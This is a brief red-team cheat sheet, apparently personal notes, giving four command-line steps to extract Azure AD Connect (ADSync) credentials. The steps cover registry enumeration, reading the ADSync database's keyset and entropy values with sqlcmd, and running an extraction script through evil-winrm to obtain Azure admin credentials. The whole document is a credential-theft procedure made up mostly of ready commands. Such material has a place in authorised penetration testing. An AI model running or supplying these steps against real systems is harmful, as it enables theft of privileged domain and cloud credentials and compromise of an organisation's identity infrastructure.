### Resource: https://blog.xpnsec.com/azuread-connect-for-redteam/

### Service Name: ADSync

### Tools: https://github.com/dirkjanm/adconnectdump

### STEPS:

#### 1) Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync (Enumerate the service instance using the registry)

#### 2) Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force (Obtain the file and product version)

#### 3) sqlcmd -S HOSTNAME -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration" (Query the values that you might need to add to the script corresponding to your use case) (Optional)

#### 4) evil-winrm -i IP_ADDRESS -u USERNAME -p "PASSWORD" -s . adconnect.ps1 (Run the powershell script against the target to extract the Azure Admin credentials)
